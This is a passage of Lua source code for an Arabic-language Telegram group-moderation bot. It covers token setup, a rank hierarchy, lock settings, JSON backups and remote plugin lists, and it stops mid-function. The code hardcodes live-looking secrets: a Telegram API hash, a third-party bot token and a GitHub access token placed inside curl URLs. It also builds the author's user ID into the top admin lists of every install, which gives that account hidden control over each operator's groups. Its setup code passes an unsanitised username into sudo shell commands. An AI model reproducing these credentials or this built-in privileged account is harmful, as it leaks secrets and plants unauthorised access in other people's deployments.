Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
redis = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http")
https   = require("ssl.https")
-------------------------------------------------------------------
whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
uptime=io.popen([[echo `uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"D,",h+0,"H,",m+0,"M."}'`]]):read('*a'):gsub('[\n\r]+', '')
CPUPer=io.popen([[echo `top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`]]):read('*a'):gsub('[\n\r]+', '')
HardDisk=io.popen([[echo `df -lh | awk '{if ($6 == "/") { print $3"/"$2" ( "$5" )" }}'`]]):read('*a'):gsub('[\n\r]+', '')
linux_version=io.popen([[echo `lsb_release -ds`]]):read('*a'):gsub('[\n\r]+', '')
memUsedPrc=io.popen([[echo `free -m | awk 'NR==2{printf "%sMB/%sMB ( %.2f% )\n", $3,$2,$3*100/$2 }'`]]):read('*a'):gsub('[\n\r]+', '')
-------------------------------------------------------------------
Runbot = require('luatele')
-------------------------------------------------------------------
local infofile = io.open("./sudo.lua","r")
if not infofile then
if not redis:get(Server_Done.."token") then
os.execute('sudo rm -rf setup.lua')
io.write('\27[1;31mSend your Bot Token Now\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request("https://api.telegram.org/bot"..TokenBot.."/getMe")
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mBot Token is Wrong\n')
else
io.write('\27[1;34mThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .infoBot/'..TheTokenBot)
redis:setex(Server_Done.."token",300,TokenBot)
end 
else
print('\27[1;34mToken not saved, try again')
end 
os.execute('lua5.3 start.lua')
end
if not redis:get(Server_Done.."id") then
io.write('\27[1;31mSend Developer ID\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('%d+') then
io.write('\n\27[1;34mDeveloper ID saved \n\n\27[0;39;49m')
redis:setex(Server_Done.."id",300,UserId)
else
print('\n\27[1;34mDeveloper ID not saved\n')
end 
os.execute('lua5.3 start.lua')
end
local url , res = https.request('https://api.telegram.org/bot'..redis:get(Server_Done.."token")..'/getMe')
local Json_Info = JSON.decode(url)
local Inform = io.open("sudo.lua", 'w')
Inform:write([[
return {
	
Token = "]]..redis:get(Server_Done.."token")..[[",

id = ]]..redis:get(Server_Done.."id")..[[

}
]])
Inform:close()
local start = io.open("start", 'w')
start:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 start.lua
done
]])
start:close()
local Run = io.open("Run", 'w')
Run:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..Json_Info.result.username..[[ -X kill
screen -S ]]..Json_Info.result.username..[[ ./start
done
]])
Run:close()
redis:del(Server_Done.."id")
redis:del(Server_Done.."token")
os.execute('cp -a ../u/ ../'..Json_Info.result.username..' && rm -fr ~/u')
os.execute('cd && cd '..Json_Info.result.username..';chmod +x start;chmod +x Run;./Run')
end
Information = dofile('./sudo.lua')
sudoid = Information.id
Token = Information.Token
bot_id = Token:match("(%d+)")
os.execute('sudo rm -fr .infoBot/'..bot_id)
bot = Runbot.set_config{
api_id=16097628,
api_hash='d21f327886534832fdf728117ac7b809',
session_name=bot_id,
token=Token
}
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
namebot = redis:get(bot_id..":namebot") or "راومو"
SudosS = {1342680269}
Sudos = {sudoid,1342680269}
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender.user_id) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function devS(user)  
local idSu = false  
for k,v in pairs(SudosS) do  
if tonumber(user) == tonumber(v) then  
idSu = true    
end
end  
return idSu  
end
function devB(user)  
local idSub = false  
for k,v in pairs(Sudos) do  
if tonumber(user) == tonumber(v) then  
idSub = true    
end
end  
return idSub
end
function programmer(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":Status:programmer",msg.sender.user_id) or devB(msg.sender.user_id) then    
return true  
else  
return false  
end  
end
end
function developer(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":Status:developer",msg.sender.user_id) or programmer(msg) then    
return true  
else  
return false  
end  
end
end
function Creator(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Creator", msg.sender.user_id) or developer(msg) then    
return true  
else  
return false  
end  
end
end
function BasicConstructor(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:BasicConstructor", msg.sender.user_id) or Creator(msg) then    
return true  
else  
return false  
end  
end
end
function Constructor(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Constructor", msg.sender.user_id) or BasicConstructor(msg) then    
return true  
else  
return false  
end  
end
end
function Owner(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Owner", msg.sender.user_id) or Constructor(msg) then    
return true  
else  
return false  
end  
end
end
function Administrator(msg)
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Administrator", msg.sender.user_id) or Owner(msg) then    
return true  
else  
return false  
end  
end
end
function Vips(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Vips", msg.sender.user_id) or Administrator(msg) or Bot(msg) then    
return true  
else  
return false  
end  
end
end
function Get_Rank(user_id,chat_id)
if devS(user_id) then  
var = 'مبرمج السورس'
elseif devB(user_id) then 
var = "المطور الاساسي"  
elseif redis:sismember(bot_id..":Status:programmer", user_id) then
var = "المطور الثانوي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = "البوت"
elseif redis:sismember(bot_id..":Status:developer", user_id) then
var = redis:get(bot_id..":Reply:developer"..chat_id) or "المطور"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator", user_id) then
var = redis:get(bot_id..":Reply:Creator"..chat_id) or "المالك"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", user_id) then
var = redis:get(bot_id..":Reply:BasicConstructor"..chat_id) or "المنشئ الاساسي"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", user_id) then
var = redis:get(bot_id..":Reply:Constructor"..chat_id) or "المنشئ"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", user_id) then
var = redis:get(bot_id..":Reply:Owner"..chat_id)  or "المدير"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", user_id) then
var = redis:get(bot_id..":Reply:Administrator"..chat_id) or "الادمن"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", user_id) then
var = redis:get(bot_id..":Reply:Vips"..chat_id) or "المميز"  
else  
var = redis:get(bot_id..":Reply:mem"..chat_id) or "العضو"
end  
return var
end 
function Norank(user_id,chat_id)
if devS(user_id) then  
var = false
elseif devB(user_id) then 
var = false
elseif redis:sismember(bot_id..":Status:programmer", user_id) then
var = false
elseif tonumber(user_id) == tonumber(bot_id) then  
var = false
elseif redis:sismember(bot_id..":Status:developer", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", user_id) then
var = false
else  
var = true
end  
return var
end 
function Isrank(user_id,chat_id)
if devS(user_id) then  
var = false
elseif devB(user_id) then 
var = false
elseif redis:sismember(bot_id..":Status:programmer", user_id) then
var = false
elseif tonumber(user_id) == tonumber(bot_id) then  
var = false
elseif redis:sismember(bot_id..":Status:developer", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", user_id) then
var = true
else  
var = true
end  
return var
end 
function Total_message(msgs)  
local message = ''  
if tonumber(msgs) < 100 then 
message = 'غير متفاعل' 
elseif tonumber(msgs) < 200 then 
message = 'بده يتحسن' 
elseif tonumber(msgs) < 400 then 
message = 'شبه متفاعل' 
elseif tonumber(msgs) < 700 then 
message = 'متفاعل' 
elseif tonumber(msgs) < 1200 then 
message = 'متفاعل قوي' 
elseif tonumber(msgs) < 2000 then 
message = 'متفاعل جدا' 
elseif tonumber(msgs) < 3500 then 
message = 'اقوى تفاعل'  
elseif tonumber(msgs) < 4000 then 
message = 'متفاعل نار' 
elseif tonumber(msgs) < 4500 then 
message = 'قمة التفاعل' 
elseif tonumber(msgs) < 5500 then 
message = 'اقوى متفاعل' 
elseif tonumber(msgs) < 7000 then 
message = 'ملك التفاعل' 
elseif tonumber(msgs) < 9500 then 
message = 'امبروطور التفاعل' 
elseif tonumber(msgs) < 10000000000 then 
message = 'رب التفاعل'  
end 
return message 
end
function GetBio(User)
local var = "لايوجد"
local InfoUser = bot.getUserFullInfo(User)
if InfoUser.bio and InfoUser.bio ~= "" and InfoUser.bio ~= " " then
var = InfoUser.bio
end
return var
end
function ChannelJoin(msg)
JoinChannel = true
local url , res = https.request('https://api.telegram.org/bot1979813752:AAH1uukJLj-ve-oxlLsySmwcT9O_Wlls_ZQ/getchatmember?chat_id=@QQOQQD&user_id='..msg.sender.user_id)
local ChannelJoin = JSON.decode(url)
if ChannelJoin and ChannelJoin.result and ChannelJoin.result.status == "left" then
JoinChannel = false
end
return JoinChannel
end
function GetInfoBot(msg)
local GetMemberStatus = bot.getChatMember(msg.chat_id,bot_id).status
if GetMemberStatus.can_change_info then
change_info = true else change_info = false
end
if GetMemberStatus.can_delete_messages then
delete_messages = true else delete_messages = false
end
if GetMemberStatus.can_invite_users then
invite_users = true else invite_users = false
end
if GetMemberStatus.can_pin_messages then
pin_messages = true else pin_messages = false
end
if GetMemberStatus.can_restrict_members then
restrict_members = true else restrict_members = false
end
if GetMemberStatus.can_promote_members then
promote = true else promote = false
end
return{
SetAdmin = promote,
BanUser = restrict_members,
Invite = invite_users,
PinMsg = pin_messages,
DelMsg = delete_messages,
Info = change_info
}
end
function GetSetieng(ChatId)
if redis:get(bot_id..":"..ChatId..":settings:messageVideo") == "del" then
messageVideo= "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageVideo") == "ked" then 
messageVideo= "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageVideo") == "ktm" then 
messageVideo= "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageVideo") == "kick" then 
messageVideo= "بالطرد "   
else
messageVideo= "✔️"   
end   
if redis:get(bot_id..":"..ChatId..":settings:messagePhoto") == "del" then
messagePhoto = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messagePhoto") == "ked" then 
messagePhoto = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messagePhoto") == "ktm" then 
messagePhoto = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messagePhoto") == "kick" then 
messagePhoto = "بالطرد "   
else
messagePhoto = "✔️"   
end   
if redis:get(bot_id..":"..ChatId..":settings:JoinByLink") == "del" then
JoinByLink = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:JoinByLink") == "ked" then 
JoinByLink = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:JoinByLink") == "ktm" then 
JoinByLink = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:JoinByLink") == "kick" then 
JoinByLink = "بالطرد "   
else
JoinByLink = "✔️"   
end   
if redis:get(bot_id..":"..ChatId..":settings:WordsEnglish") == "del" then
WordsEnglish = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:WordsEnglish") == "ked" then 
WordsEnglish = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:WordsEnglish") == "ktm" then 
WordsEnglish = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:WordsEnglish") == "kick" then 
WordsEnglish = "بالطرد "   
else
WordsEnglish = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:WordsPersian") == "del" then
WordsPersian = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:WordsPersian") == "ked" then 
WordsPersian = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:WordsPersian") == "ktm" then 
WordsPersian = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:WordsPersian") == "kick" then 
WordsPersian = "بالطرد "   
else
WordsPersian = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageVoiceNote") == "del" then
messageVoiceNote = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageVoiceNote") == "ked" then 
messageVoiceNote = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageVoiceNote") == "ktm" then 
messageVoiceNote = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageVoiceNote") == "kick" then 
messageVoiceNote = "بالطرد "   
else
messageVoiceNote = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageSticker") == "del" then
messageSticker= "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageSticker") == "ked" then 
messageSticker= "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageSticker") == "ktm" then 
messageSticker= "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageSticker") == "kick" then 
messageSticker= "بالطرد "   
else
messageSticker= "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:AddMempar") == "del" then
AddMempar = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:AddMempar") == "ked" then 
AddMempar = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:AddMempar") == "ktm" then 
AddMempar = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:AddMempar") == "kick" then 
AddMempar = "بالطرد "   
else
AddMempar = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageAnimation") == "del" then
messageAnimation = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageAnimation") == "ked" then 
messageAnimation = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageAnimation") == "ktm" then 
messageAnimation = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageAnimation") == "kick" then 
messageAnimation = "بالطرد "   
else
messageAnimation = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageDocument") == "del" then
messageDocument= "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageDocument") == "ked" then 
messageDocument= "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageDocument") == "ktm" then 
messageDocument= "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageDocument") == "kick" then 
messageDocument= "بالطرد "   
else
messageDocument= "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageAudio") == "del" then
messageAudio = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageAudio") == "ked" then 
messageAudio = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageAudio") == "ktm" then 
messageAudio = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageAudio") == "kick" then 
messageAudio = "بالطرد "   
else
messageAudio = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messagePoll") == "del" then
messagePoll = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messagePoll") == "ked" then 
messagePoll = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messagePoll") == "ktm" then 
messagePoll = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messagePoll") == "kick" then 
messagePoll = "بالطرد "   
else
messagePoll = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageVideoNote") == "del" then
messageVideoNote = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageVideoNote") == "ked" then 
messageVideoNote = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageVideoNote") == "ktm" then 
messageVideoNote = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageVideoNote") == "kick" then 
messageVideoNote = "بالطرد "   
else
messageVideoNote = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageContact") == "del" then
messageContact = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageContact") == "ked" then 
messageContact = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageContact") == "ktm" then 
messageContact = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageContact") == "kick" then 
messageContact = "بالطرد "   
else
messageContact = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageLocation") == "del" then
messageLocation = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageLocation") == "ked" then 
messageLocation = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageLocation") == "ktm" then 
messageLocation = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageLocation") == "kick" then 
messageLocation = "بالطرد "   
else
messageLocation = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Cmd") == "del" then
Cmd = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Cmd") == "ked" then 
Cmd = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Cmd") == "ktm" then 
Cmd = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Cmd") == "kick" then 
Cmd = "بالطرد "   
else
Cmd = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageSenderChat") == "del" then
messageSenderChat = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageSenderChat") == "ked" then 
messageSenderChat = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageSenderChat") == "ktm" then 
messageSenderChat = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageSenderChat") == "kick" then 
messageSenderChat = "بالطرد "   
else
messageSenderChat = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messagePinMessage") == "del" then
messagePinMessage = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messagePinMessage") == "ked" then 
messagePinMessage = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messagePinMessage") == "ktm" then 
messagePinMessage = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messagePinMessage") == "kick" then 
messagePinMessage = "بالطرد "   
else
messagePinMessage = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Keyboard") == "del" then
Keyboard = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Keyboard") == "ked" then 
Keyboard = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Keyboard") == "ktm" then 
Keyboard = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Keyboard") == "kick" then 
Keyboard = "بالطرد "   
else
Keyboard = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Username") == "del" then
Username = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Username") == "ked" then 
Username = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Username") == "ktm" then 
Username = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Username") == "kick" then 
Username = "بالطرد "   
else
Username = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Tagservr") == "del" then
Tagservr = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Tagservr") == "ked" then 
Tagservr = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Tagservr") == "ktm" then 
Tagservr = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Tagservr") == "kick" then 
Tagservr = "بالطرد "   
else
Tagservr = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:WordsFshar") == "del" then
WordsFshar = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:WordsFshar") == "ked" then 
WordsFshar = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:WordsFshar") == "ktm" then 
WordsFshar = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:WordsFshar") == "kick" then 
WordsFshar = "بالطرد "   
else
WordsFshar = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Markdaun") == "del" then
Markdaun = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Markdaun") == "ked" then 
Markdaun = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Markdaun") == "ktm" then 
Markdaun = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Markdaun") == "kick" then 
Markdaun = "بالطرد "   
else
Markdaun = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Links") == "del" then
Links = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Links") == "ked" then 
Links = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Links") == "ktm" then 
Links = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Links") == "kick" then 
Links = "بالطرد "   
else
Links = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:forward_info") == "del" then
forward_info = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:forward_info") == "ked" then 
forward_info = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:forward_info") == "ktm" then 
forward_info = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:forward_info") == "kick" then 
forward_info = "بالطرد "   
else
forward_info = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:messageChatAddMembers") == "del" then
messageChatAddMembers = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:messageChatAddMembers") == "ked" then 
messageChatAddMembers = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:messageChatAddMembers") == "ktm" then 
messageChatAddMembers = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:messageChatAddMembers") == "kick" then 
messageChatAddMembers = "بالطرد "   
else
messageChatAddMembers = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:via_bot_user_id") == "del" then
via_bot_user_id = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:via_bot_user_id") == "ked" then 
via_bot_user_id = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:via_bot_user_id") == "ktm" then 
via_bot_user_id = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:via_bot_user_id") == "kick" then 
via_bot_user_id = "بالطرد "   
else
via_bot_user_id = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Hashtak") == "del" then
Hashtak = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Hashtak") == "ked" then 
Hashtak = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Hashtak") == "ktm" then 
Hashtak = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Hashtak") == "kick" then 
Hashtak = "بالطرد "   
else
Hashtak = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Edited") == "del" then
Edited = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Edited") == "ked" then 
Edited = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Edited") == "ktm" then 
Edited = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Edited") == "kick" then 
Edited = "بالطرد "   
else
Edited = "✔️"   
end    
if redis:get(bot_id..":"..ChatId..":settings:Spam") == "del" then
Spam = "❌" 
elseif redis:get(bot_id..":"..ChatId..":settings:Spam") == "ked" then 
Spam = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:Spam") == "ktm" then 
Spam = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:Spam") == "kick" then 
Spam = "بالطرد "   
else
Spam = "✔️"   
end    
if redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "kick" then 
flood = "بالطرد "   
elseif redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "del" then 
flood = "❌" 
elseif redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "ked" then
flood = "بالتقييد "   
elseif redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "ktm" then
flood = "بالكتم "    
else
flood = "✔️"   
end     
return {
flood = flood,
Spam = Spam,
Edited = Edited,
Hashtak = Hashtak,
messageChatAddMembers = messageChatAddMembers,
via_bot_user_id = via_bot_user_id,
Markdaun = Markdaun,
Links = Links,
forward_info = forward_info ,
Username = Username,
WordsFshar = WordsFshar,
Tagservr = Tagservr,
messagePinMessage = messagePinMessage,
messageSenderChat = messageSenderChat,
Keyboard = Keyboard,
messageLocation = messageLocation,
Cmd = Cmd,
messageContact =messageContact,
messageAudio = messageAudio,
messageVideoNote = messageVideoNote,
messagePoll = messagePoll,
messageDocument= messageDocument,
messageAnimation = messageAnimation,
AddMempar = AddMempar,
messageSticker= messageSticker,
WordsPersian = WordsPersian,
messageVoiceNote = messageVoiceNote,
JoinByLink = JoinByLink,
messagePhoto = messagePhoto,
WordsEnglish = WordsEnglish,
messageVideo= messageVideo
}
end
function Reply_Status(UserId,TextMsg)
UserInfo = bot.getUser(UserId)
Name_User = UserInfo.first_name
if UserInfo.username and UserInfo.username ~= "" then
UserInfousername = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
else
UserInfousername = '['..UserInfo.first_name..'](tg://user?id='..UserId..')'
end

return {
by = '\n*↯︙بواسطة ↫*「 '..UserInfousername..' 」\n'..TextMsg..'',
i = '\n*↯︙العضو ↫*「 '..UserInfousername..' 」\n'..TextMsg..'',
yu = '\n*↯︙عزيزي ↫*「 '..UserInfousername..' 」\n'..TextMsg..'',
helo = '\n*↯︙المستخدم ↫*「 '..UserInfousername..' 」\n'..TextMsg..'',
}
end
function getJson(R)  
programmer = redis:smembers(bot_id..":Status:programmer")
developer = redis:smembers(bot_id..":Status:developer")
user_id = redis:smembers(bot_id..":user_id")
chat_idgr = redis:smembers(bot_id..":Groups")
local fresuult = {
programmer = programmer,
developer = developer,
chat_id = chat_idgr,
user_id = user_id, 
bot = bot_id
} 
gresuult = {} 
for k,v in pairs(chat_idgr) do   
Creator = redis:smembers(bot_id..":"..v..":Status:Creator")
if Creator then
cre = {ids = Creator}
end
BasicConstructor = redis:smembers(bot_id..":"..v..":Status:BasicConstructor")
if BasicConstructor then
bc = {ids = BasicConstructor}
end
Constructor = redis:smembers(bot_id..":"..v..":Status:Constructor")
if Constructor then
cr = {ids = Constructor}
end
Owner = redis:smembers(bot_id..":"..v..":Status:Owner")
if Owner then
on = {ids = Owner}
end
Administrator = redis:smembers(bot_id..":"..v..":Status:Administrator")
if Administrator then
ad = {ids = Administrator}
end
Vips = redis:smembers(bot_id..":"..v..":Status:Vips")
if Vips then
vp = {ids = Vips}
end
gresuult[v] = {
BasicConstructor = bc,
Administrator = ad, 
Constructor = cr, 
Creator = cre, 
Owner = on,
Vips = vp
}
end
local resuult = {
bot = fresuult,
groups = gresuult
}
local File = io.open('./'..bot_id..'.json', "w")
File:write(JSON.encode (resuult))
File:close()
bot.sendDocument(R,0,'./'..bot_id..'.json', '•  تم جلب النسخه الاحتياطيه', 'md')
end
function oger(Message)
year = math.floor(Message / 31536000)
byear = Message % 31536000 
month = math.floor(byear / 2592000)
bmonth = byear % 2592000 
day = math.floor(bmonth / 86400)
bday = bmonth % 86400 
hours = math.floor( bday / 3600)
bhours = bday % 3600 
minx = math.floor(bhours / 60)
sec = math.floor(bhours % 3600) % 60
return string.format("%02d:%02d", minx, sec)
end
function download(url,name)
if not name then
name = url:match('([^/]+)$')
end
if string.find(url,'https') then
data,res = https.request(url)
elseif string.find(url,'http') then
data,res = http.request(url)
else
return 'The link format is incorrect.'
end
if res ~= 200 then
return 'check url , error code : '..res
else
file = io.open(name,'wb')
file:write(data)
file:close()
return './'..name
end
end
function Run_Callback()
local Get_Files  = io.popen("curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/getfile.json"):read('*a')
if Get_Files  and Get_Files ~= "404: Not Found" then
local json = JSON.decode(Get_Files)
for v,k in pairs(json.plugins_) do
local CheckFileisFound = io.open("hso_Files/"..v,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
dofile("hso_Files/"..v)
end
end
end
end
function Return_Callback(msg)
local Get_Files  = io.popen("curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/getfile.json"):read('*a')
if Get_Files  and Get_Files ~= "404: Not Found" then
